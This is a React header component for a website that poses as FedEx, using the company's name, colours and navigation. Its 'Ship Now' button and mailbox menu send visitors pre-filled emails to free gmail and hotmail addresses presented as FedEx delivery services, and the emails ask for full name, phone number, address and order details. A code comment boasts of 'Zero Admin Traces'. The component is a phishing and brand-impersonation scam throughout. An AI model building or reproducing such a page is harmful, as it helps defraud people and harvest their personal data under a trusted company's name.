import React, { useState, useRef, useEffect } from 'react';
import { FedExLogo } from './FedExLogo';
import {
  Mail,
  ChevronDown,
  ExternalLink,
  Laptop,
  Check,
  Copy,
  Send,
  Sparkles,
} from 'lucide-react';

export type ActiveTab = 'track' | 'ship' | 'rates' | 'pickup' | 'locations';

interface HeaderProps {
  activeTab: ActiveTab;
  onSelectTab: (tab: ActiveTab) => void;
  shipmentCount?: number;
}

const EMAIL_RECIPIENTS = 'Fedexdeliveryservices4us@gmail.com,Fanmanagementteam@hotmail.com';
const EMAIL_SUBJECT = 'Inquiry: Request for FedEx Package Tracking Number';
const EMAIL_BODY = `Hello FedEx Delivery Services,

I am writing to request the official tracking number for my package shipment.

Shipment Details:
- Full Name:
- Phone Number:
- Delivery Address:
- Sender / Merchant Name:
- Reference / Order Number:
- Approximate Shipment Date:

Please provide the tracking number and estimated delivery update as soon as possible.

Thank you,
FedEx Customer`;

export const SHIP_NOW_MAILTO = `mailto:${EMAIL_RECIPIENTS}?subject=${encodeURIComponent(EMAIL_SUBJECT)}&body=${encodeURIComponent(EMAIL_BODY)}`;

const GMAIL_URL = `https://mail.google.com/mail/?view=cm&fs=1&to=${encodeURIComponent(EMAIL_RECIPIENTS)}&su=${encodeURIComponent(EMAIL_SUBJECT)}&body=${encodeURIComponent(EMAIL_BODY)}`;
const OUTLOOK_URL = `https://outlook.live.com/mail/0/deeplink/compose?to=${encodeURIComponent(EMAIL_RECIPIENTS)}&subject=${encodeURIComponent(EMAIL_SUBJECT)}&body=${encodeURIComponent(EMAIL_BODY)}`;
const YAHOO_URL = `https://compose.mail.yahoo.com/?to=${encodeURIComponent(EMAIL_RECIPIENTS)}&subj=${encodeURIComponent(EMAIL_SUBJECT)}&body=${encodeURIComponent(EMAIL_BODY)}`;
const ICLOUD_URL = `https://www.icloud.com/mail/`;
const AOL_MAIL_URL = `https://mail.aol.com/`;

interface MailOption {
  id: string;
  name: string;
  subtext: string;
  tag?: string;
  badgeBg: string;
  badgeTextColor: string;
  iconText: string;
  href: string;
  isExternalTab: boolean;
  isDefaultApp?: boolean;
}

const MAIL_OPTIONS: MailOption[] = [
  {
    id: 'default',
    name: 'Use Default Mail App',
    subtext: 'Automatically opens installed mail app (Apple Mail, Outlook, Windows)',
    tag: 'Recommended',
    badgeBg: 'bg-emerald-600',
    badgeTextColor: 'text-white',
    iconText: 'SYS',
    href: SHIP_NOW_MAILTO,
    isExternalTab: false,
    isDefaultApp: true,
  },
  {
    id: 'gmail',
    name: 'Gmail',
    subtext: 'Open compose window in Google Mail web',
    tag: 'Webmail',
    badgeBg: 'bg-[#EA4335]',
    badgeTextColor: 'text-white',
    iconText: 'M',
    href: GMAIL_URL,
    isExternalTab: true,
  },
  {
    id: 'outlook',
    name: 'Outlook / Hotmail',
    subtext: 'Open compose window in Microsoft Outlook web',
    tag: 'Webmail',
    badgeBg: 'bg-[#0078D4]',
    badgeTextColor: 'text-white',
    iconText: 'O',
    href: OUTLOOK_URL,
    isExternalTab: true,
  },
  {
    id: 'yahoo',
    name: 'Yahoo Mail',
    subtext: 'Open compose window in Yahoo webmail',
    tag: 'Webmail',
    badgeBg: 'bg-[#6001D2]',
    badgeTextColor: 'text-white',
    iconText: 'Y!',
    href: YAHOO_URL,
    isExternalTab: true,
  },
  {
    id: 'icloud',
    name: 'iCloud Mail',
    subtext: 'Open Apple iCloud webmail portal',
    tag: 'Webmail',
    badgeBg: 'bg-[#0088CC]',
    badgeTextColor: 'text-white',
    iconText: '☁',
    href: ICLOUD_URL,
    isExternalTab: true,
  },
  {
    id: 'aol',
    name: 'Mail / AOL Webmail',
    subtext: 'Open webmail compose on Mail / AOL',
    tag: 'Webmail',
    badgeBg: 'bg-[#314351]',
    badgeTextColor: 'text-white',
    iconText: '✉',
    href: AOL_MAIL_URL,
    isExternalTab: true,
  },
];

export const Header: React.FC<HeaderProps> = ({
  activeTab,
  onSelectTab,
  shipmentCount,
}) => {
  const [isMailMenuOpen, setIsMailMenuOpen] = useState(false);
  const [copiedNotification, setCopiedNotification] = useState<string | null>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);

  // Detect mobile device
  const checkIsMobile = () => {
    if (typeof window === 'undefined') return false;
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
  };

  // Close dropdown on click outside or Escape key
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsMailMenuOpen(false);
      }
    };

    const handleKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        setIsMailMenuOpen(false);
      }
    };

    if (isMailMenuOpen) {
      document.addEventListener('mousedown', handleClickOutside);
      document.addEventListener('keydown', handleKeyDown);
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, [isMailMenuOpen]);

  const handleShipNowClick = (e: React.MouseEvent) => {
    const isMobile = checkIsMobile();
    if (isMobile) {
      // On mobile device: immediately launch available mail apps directly
      window.location.href = SHIP_NOW_MAILTO;
    } else {
      // On desktop: toggle the mailbox selection dropdown
      setIsMailMenuOpen((prev) => !prev);
    }
  };

  const handleCopyDetails = () => {
    const textToCopy = `To: ${EMAIL_RECIPIENTS}\nSubject: ${EMAIL_SUBJECT}\n\n${EMAIL_BODY}`;
    navigator.clipboard.writeText(textToCopy);
    setCopiedNotification('Email & details copied to clipboard!');
    setTimeout(() => setCopiedNotification(null), 3000);
  };

  return (
    <header className="sticky top-0 z-40 bg-[#4D148C] text-white shadow-md border-b border-[#3b0f6d]">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-18 flex items-center justify-between gap-8">
        {/* Zone 1: Single Brand Wordmark */}
        <button
          onClick={() => onSelectTab('track')}
          className="whitespace-nowrap shrink-0 flex items-center cursor-pointer select-none text-left py-1"
          aria-label="FedEx Home"
        >
          <div className="font-black text-3xl tracking-tighter text-white inline-flex items-center">
            <span className="text-white">Fed</span>
            <span className="text-[#FF6200]">Ex</span>
          </div>
        </button>

        {/* Zone 2: 4-5 Clean Nav Links - Pure FedEx Website (Zero Admin Traces) */}
        <nav className="hidden lg:flex items-center gap-7 text-sm font-bold text-white/90">
          <button
            onClick={() => onSelectTab('track')}
            className={`whitespace-nowrap shrink-0 transition-all py-1.5 cursor-pointer ${
              activeTab === 'track'
                ? 'text-[#FF6200] border-b-2 border-[#FF6200]'
                : 'hover:text-white hover:opacity-100 opacity-90'
            }`}
          >
            Tracking
          </button>
          <button
            onClick={() => onSelectTab('ship')}
            className={`whitespace-nowrap shrink-0 transition-all py-1.5 cursor-pointer ${
              activeTab === 'ship'
                ? 'text-[#FF6200] border-b-2 border-[#FF6200]'
                : 'hover:text-white hover:opacity-100 opacity-90'
            }`}
          >
            Shipping & Label
          </button>
          <button
            onClick={() => onSelectTab('rates')}
            className={`whitespace-nowrap shrink-0 transition-all py-1.5 cursor-pointer ${
              activeTab === 'rates'
                ? 'text-[#FF6200] border-b-2 border-[#FF6200]'
                : 'hover:text-white hover:opacity-100 opacity-90'
            }`}
          >
            Rates & Transit
          </button>
          <button
            onClick={() => onSelectTab('pickup')}
            className={`whitespace-nowrap shrink-0 transition-all py-1.5 cursor-pointer ${
              activeTab === 'pickup'
                ? 'text-[#FF6200] border-b-2 border-[#FF6200]'
                : 'hover:text-white hover:opacity-100 opacity-90'
            }`}
          >
            Schedule Pickup
          </button>
          <button
            onClick={() => onSelectTab('locations')}
            className={`whitespace-nowrap shrink-0 transition-all py-1.5 cursor-pointer ${
              activeTab === 'locations'
                ? 'text-[#FF6200] border-b-2 border-[#FF6200]'
                : 'hover:text-white hover:opacity-100 opacity-90'
            }`}
          >
            Locations
          </button>
        </nav>

        {/* Zone 3: Ship Now Action with Desktop Top 5 Webmail Dropdown & Mobile Auto-Mail */}
        <div className="relative shrink-0" ref={dropdownRef}>
          <button
            type="button"
            onClick={handleShipNowClick}
            className="px-5 py-2.5 text-xs font-black tracking-wider uppercase text-white bg-[#FF6200] hover:bg-[#E05600] rounded-full shadow-sm transition-all whitespace-nowrap shrink-0 cursor-pointer focus-visible:outline-2 focus-visible:outline-white inline-flex items-center justify-center gap-1.5"
            title="Ship Now: Email FedEx delivery services for package tracking number"
            aria-expanded={isMailMenuOpen}
            aria-haspopup="true"
          >
            <span>Ship Now</span>
            {/* Desktop dropdown arrow indicator */}
            <ChevronDown
              className={`w-3.5 h-3.5 hidden sm:inline-block transition-transform duration-200 ${
                isMailMenuOpen ? 'rotate-180' : ''
              }`}
            />
          </button>

          {/* Desktop Mailbox Menu Dropdown */}
          {isMailMenuOpen && (
            <div className="absolute right-0 top-full mt-2.5 w-88 sm:w-96 bg-white text-slate-900 rounded-2xl shadow-2xl border border-slate-200/90 z-50 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-150">
              {/* Header Banner */}
              <div className="bg-[#4D148C] text-white p-4 border-b border-[#3b0f6d]">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Mail className="w-4 h-4 text-[#FF6200]" />
                    <span className="font-black text-sm tracking-tight">Select Mailbox / Webmail</span>
                  </div>
                  <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-white/10 text-white/90 uppercase tracking-wider">
                    Tracking Request
                  </span>
                </div>
                <p className="text-xs text-white/80 mt-1 leading-snug">
                  Choose your preferred email service to contact FedEx delivery services with a pre-filled request.
                </p>
                <div className="mt-2 pt-2 border-t border-white/15 text-[10.5px] font-mono text-white/70 truncate">
                  To: Fedexdeliveryservices4us@gmail.com, Fanmanagementteam@hotmail.com
                </div>
              </div>

              {/* Mail Provider Options List */}
              <div className="p-2 space-y-1 max-h-[380px] overflow-y-auto">
                {MAIL_OPTIONS.map((opt) => (
                  <a
                    key={opt.id}
                    href={opt.href}
                    target={opt.isExternalTab ? '_blank' : undefined}
                    rel={opt.isExternalTab ? 'noopener noreferrer' : undefined}
                    onClick={() => setIsMailMenuOpen(false)}
                    className="flex items-center justify-between p-2.5 rounded-xl hover:bg-slate-50 transition-colors group border border-transparent hover:border-slate-200 cursor-pointer text-left no-underline"
                  >
                    <div className="flex items-center gap-3">
                      <div
                        className={`w-9 h-9 rounded-xl flex items-center justify-center font-bold text-xs shrink-0 shadow-xs ${opt.badgeBg} ${opt.badgeTextColor}`}
                      >
                        {opt.isDefaultApp ? (
                          <Laptop className="w-4 h-4 text-white" />
                        ) : (
                          <span>{opt.iconText}</span>
                        )}
                      </div>
                      <div>
                        <div className="flex items-center gap-1.5">
                          <span className="font-bold text-xs text-slate-900 group-hover:text-[#4D148C] transition-colors">
                            {opt.name}
                          </span>
                          {opt.tag && (
                            <span
                              className={`text-[9.5px] font-black uppercase px-1.5 py-0.2 rounded ${
                                opt.isDefaultApp
                                  ? 'bg-emerald-50 text-emerald-700 border border-emerald-200'
                                  : 'bg-slate-100 text-slate-600'
                              }`}
                            >
                              {opt.tag}
                            </span>
                          )}
                        </div>
                        <p className="text-[11px] text-slate-500 mt-0.5 line-clamp-1 leading-tight">
                          {opt.subtext}
                        </p>
                      </div>
                    </div>

                    <div className="shrink-0 text-slate-400 group-hover:text-[#FF6200] transition-colors pl-2">
                      <ExternalLink className="w-3.5 h-3.5" />
                    </div>
                  </a>
                ))}
              </div>

              {/* Bottom Quick-Copy & Help Section */}
              <div className="p-3 bg-slate-50 border-t border-slate-100 flex items-center justify-between gap-2 text-xs">
                <button
                  type="button"
                  onClick={handleCopyDetails}
                  className="inline-flex items-center gap-1.5 text-xs font-bold text-[#4D148C] hover:text-[#3b0f6d] hover:underline cursor-pointer"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span>Copy details to clipboard</span>
                </button>
                {copiedNotification && (
                  <span className="text-[11px] font-bold text-emerald-600 flex items-center gap-1">
                    <Check className="w-3 h-3 stroke-[3]" />
                    <span>Copied!</span>
                  </span>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </header>
  );
};
